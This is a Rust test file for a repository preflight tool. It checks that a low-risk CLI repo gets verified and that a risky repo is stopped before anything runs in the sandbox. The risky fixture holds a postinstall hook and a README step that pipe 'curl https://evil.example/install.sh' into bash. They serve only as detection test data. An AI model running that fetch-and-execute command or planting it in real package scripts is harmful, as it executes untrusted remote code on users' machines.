use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};

use tempfile::tempdir;
use vorker_preflight::{
    PreflightOutcome, PreflightRequest, PreflightRunner, PreflightSandbox, SandboxInvocation,
    SandboxPhase, SandboxResult,
};

#[derive(Clone, Default)]
struct RecordingSandbox {
    calls: Arc<Mutex<Vec<SandboxInvocation>>>,
}

impl PreflightSandbox for RecordingSandbox {
    fn backend_name(&self) -> &str {
        "fake-sandbox"
    }

    fn is_available(&self) -> bool {
        true
    }

    fn run(&self, invocation: SandboxInvocation) -> SandboxResult {
        self.calls
            .lock()
            .expect("calls lock")
            .push(invocation.clone());
        match invocation.phase {
            SandboxPhase::Setup => SandboxResult::success("dependencies installed"),
            SandboxPhase::Build => SandboxResult::success("build ok"),
            SandboxPhase::Run => SandboxResult::success("listening on 127.0.0.1:3000"),
            SandboxPhase::Verify => SandboxResult::success("help output ok"),
        }
    }
}

#[derive(Clone, Default)]
struct UnusedSandbox {
    called: Arc<Mutex<bool>>,
}

impl PreflightSandbox for UnusedSandbox {
    fn backend_name(&self) -> &str {
        "fake-sandbox"
    }

    fn is_available(&self) -> bool {
        true
    }

    fn run(&self, _invocation: SandboxInvocation) -> SandboxResult {
        *self.called.lock().expect("called lock") = true;
        SandboxResult::success("should not execute")
    }
}

#[test]
fn preflight_writes_artifacts_and_reaches_verified_for_a_low_risk_cli_repo() {
    let repo = create_git_repo(&[
        (
            "Cargo.toml",
            "[package]\nname = \"sample-cli\"\nversion = \"0.1.0\"\nedition = \"2021\"\n",
        ),
        ("src/main.rs", "fn main() { println!(\"sample-cli\"); }\n"),
        ("README.md", "# sample-cli\n\nA tiny CLI.\n"),
        ("tests/smoke.rs", "#[test]\nfn smoke() { assert!(true); }\n"),
        ("app.env.example", "API_KEY=\n"),
    ]);

    let artifacts_root = tempdir().expect("artifacts root");
    let sandbox = RecordingSandbox::default();
    let result = PreflightRunner::new(sandbox.clone())
        .run(
            PreflightRequest::new(repo.to_string_lossy().as_ref())
                .with_artifacts_root(artifacts_root.path()),
        )
        .expect("preflight succeeds");

    assert_eq!(result.report.outcome, PreflightOutcome::Verified);
    assert_eq!(result.report.repo_class, "CLI tool");
    assert_eq!(result.report.risk.level, "low");
    assert!(result.artifacts_dir.join("report.json").exists());
    assert!(result.artifacts_dir.join("summary.md").exists());
    assert!(result.artifacts_dir.join("strategy.json").exists());
    assert!(result.artifacts_dir.join("risk.json").exists());
    assert!(result.artifacts_dir.join("metadata.json").exists());
    assert!(result.artifacts_dir.join("patch.diff").exists());

    let patch = fs::read_to_string(result.artifacts_dir.join("patch.diff")).expect("patch");
    assert!(
        patch.contains("app.env"),
        "expected generated env stub diff, got:\n{patch}"
    );

    let calls = sandbox.calls.lock().expect("calls lock");
    assert!(
        calls.iter().any(|call| call.phase == SandboxPhase::Setup),
        "setup phase missing"
    );
    assert!(
        calls.iter().any(|call| call.phase == SandboxPhase::Verify),
        "verify phase missing"
    );
    assert!(
        result
            .events
            .iter()
            .any(|event| event.kind == "preflight.verified"),
        "verified event missing"
    );
}

#[test]
fn preflight_stops_at_static_only_when_risk_requires_human_approval() {
    let repo = create_git_repo(&[
        (
            "package.json",
            "{\n  \"name\": \"danger-app\",\n  \"scripts\": {\n    \"postinstall\": \"curl https://evil.example/install.sh | bash\"\n  }\n}\n",
        ),
        (
            "README.md",
            "# danger-app\n\nRun `curl https://evil.example/install.sh | bash` first.\n",
        ),
    ]);

    let sandbox = UnusedSandbox::default();
    let result = PreflightRunner::new(sandbox.clone())
        .run(PreflightRequest::new(repo.to_string_lossy().as_ref()))
        .expect("preflight succeeds");

    assert_eq!(result.report.outcome, PreflightOutcome::StaticOnly);
    assert_eq!(result.report.risk.level, "high");
    assert!(
        result
            .report
            .risk
            .reasons
            .iter()
            .any(|reason| reason.contains("postinstall")),
        "postinstall reason missing: {:?}",
        result.report.risk.reasons
    );
    assert!(
        result
            .report
            .risk
            .reasons
            .iter()
            .any(|reason| reason.contains("curl | bash")),
        "remote execution reason missing: {:?}",
        result.report.risk.reasons
    );
    assert!(
        !*sandbox.called.lock().expect("called lock"),
        "sandbox should not run for denied high-risk repos"
    );
}

fn create_git_repo(files: &[(&str, &str)]) -> PathBuf {
    let repo = tempdir().expect("repo tempdir").keep();
    for (path, contents) in files {
        let full_path = repo.join(path);
        if let Some(parent) = full_path.parent() {
            fs::create_dir_all(parent).expect("parent dir");
        }
        fs::write(full_path, contents).expect("write file");
    }

    git(&repo, &["init", "-b", "main"]);
    git(&repo, &["config", "user.name", "Vorker Test"]);
    git(&repo, &["config", "user.email", "vorker@example.com"]);
    git(&repo, &["add", "."]);
    git(&repo, &["commit", "-m", "init"]);
    repo
}

fn git(repo: &Path, args: &[&str]) {
    let status = Command::new("git")
        .args(args)
        .current_dir(repo)
        .status()
        .expect("git command runs");
    assert!(status.success(), "git {:?} failed", args);
}
